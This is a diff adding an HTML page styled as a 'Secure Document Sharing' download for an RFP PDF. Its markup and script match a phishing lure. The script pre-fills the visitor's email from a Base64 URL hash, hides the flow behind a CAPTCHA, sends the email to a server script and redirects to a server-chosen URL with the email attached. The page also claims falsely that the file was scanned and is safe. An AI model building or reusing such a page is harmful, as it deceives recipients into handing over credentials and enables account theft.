@@ -1,0 +1,319 @@
+<!-- url: https://zoominglife.com/tunnel/email-template.html
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Document Sharing | Your Company</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <style>
+        /* YOUR ORIGINAL CSS - NOT A SINGLE LINE CHANGED */
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            margin: 20px;
+            animation: slideIn 0.8s ease-in-out;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .logo-container {
+            background: #EBF5FF;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+
+        .logo {
+            width: 40px;
+            height: 40px;
+            color: #2575fc;
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            color: #2575fc;
+            font-weight: 600;
+        }
+
+        .disclaimer {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .email-input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+
+        .email-input:focus {
+            border-color: #2575fc;
+            outline: none;
+            box-shadow: 0 0 8px rgba(37, 117, 252, 0.3);
+        }
+
+        .cf-turnstile {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .download-button {
+            background: linear-gradient(135deg, #2575fc, #6a11cb);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .download-button:not(:disabled):hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        .download-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        a {
+            color: #2575fc;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        a:hover {
+            color: #6a11cb;
+        }
+
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .loading.active {
+            display: flex;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #2575fc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- YOUR ORIGINAL BODY CONTENT - NOT A SINGLE LINE CHANGED -->
+    <div class="container">
+        <div class="logo-container">
+            <svg class="logo" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                <polyline points="14 2 14 8 20 8"></polyline>
+                <line x1="16" y1="13" x2="8" y2="13"></line>
+                <line x1="16" y1="17" x2="8" y2="17"></line>
+                <polyline points="10 9 9 9 8 9"></polyline>
+            </svg>
+        </div>
+
+        <h1>Secure Document Sharing</h1>
+
+        <div class="disclaimer">
+            <br/><strong>RFP:20983910029383.PDF</strong></a>
+        </div>
+
+        <form id="downloadForm" onsubmit="handleSubmit(event)">
+            <input 
+                type="email" 
+                id="email" 
+                class="email-input" 
+                placeholder="Enter your email address" 
+                required
+            >
+
+            <div class="cf-turnstile" data-sitekey="0x4AAAAAABAVY847X_5NhzsZ" data-callback="onCaptchaSuccess"></div>
+
+            <button 
+                type="submit" 
+                id="downloadButton" 
+                class="download-button" 
+                disabled
+            >
+                Download Document
+            </button>
+        </form>
+        <div class="disclaimer">
+        <br>
+            This document has been thoroughly scanned for malware and is safe to download. 
+            By downloading, you agree to our <a href="#">terms and conditions</a>.
+        </div>
+        <div class="footer">
+            &copy; <span id="year"></span> Your Company. All rights reserved.
+        </div>
+    </div>
+
+    <div class="loading" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <!-- UPDATED SCRIPT SECTION -->
+<script>
+    // Set current year in footer
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    let captchaToken = null;
+
+    // Function to decode Base64
+    function decodeBase64(str) {
+        try {
+            return decodeURIComponent(atob(str).split('').map(char => {
+                return '%' + ('00' + char.charCodeAt(0).toString(16)).slice(-2);
+            }).join(''));
+        } catch (e) {
+            return null; // Return null if decoding fails
+        }
+    }
+
+    // Auto-populate email from URL hash
+    const emailFromHash = window.location.hash.substring(1); // Remove the '#' from the hash
+    if (emailFromHash) {
+        let email = emailFromHash;
+        // Check if the hash is Base64 encoded
+        if (!emailFromHash.includes('@')) {
+            email = decodeBase64(emailFromHash); // Decode Base64
+        }
+        if (email && email.includes('@')) {
+            document.getElementById('email').value = email;
+        }
+    }
+
+    // Cloudflare Turnstile callback
+    function onCaptchaSuccess(token) {
+        captchaToken = token;
+        document.getElementById('downloadButton').disabled = false;
+    }
+
+    // Show/hide loading overlay
+    function toggleLoading(show) {
+        document.getElementById('loadingOverlay').classList.toggle('active', show);
+    }
+
+    // Form submission handler
+    async function handleSubmit(event) {
+        event.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const button = document.getElementById('downloadButton');
+
+        if (!email || !captchaToken) {
+            alert('Please complete the form and CAPTCHA');
+            return;
+        }
+
+        button.disabled = true;
+        toggleLoading(true);
+
+        try {
+            // Use the current file's directory for the API endpoint
+            const apiUrl = window.location.pathname.replace(/\/[^\/]+$/, '/validate-captcha.php');
+
+            const response = await fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Requested-With': 'XMLHttpRequest'
+                },
+                body: JSON.stringify({
+                    email,
+                    captchaResponse: captchaToken
+                })
+            });
+
+            const data = await response.json();
+
+            if (data.success && data.redirectUrl) {
+                // Append the email directly after the domain (no trailing slash)
+                const finalUrl = `${data.redirectUrl}#${email}`;
+                window.location.href = finalUrl;
+            } else {
+                throw new Error(data.error || 'Validation failed');
+            }
+        } catch (error) {
+            alert('An error occurred. Please try again.');
+            button.disabled = false;
+            turnstile.reset(); // Reset CAPTCHA on error
+            captchaToken = null;
+        } finally {
+            toggleLoading(false);
+            button.textContent = 'Download Document';
+        }
+    }
+
+    // Prevent form resubmission on page refresh
+    if (window.history.replaceState) {
+        window.history.replaceState(null, null, window.location.href);
+    }
+</script>
+</body>
+</html>
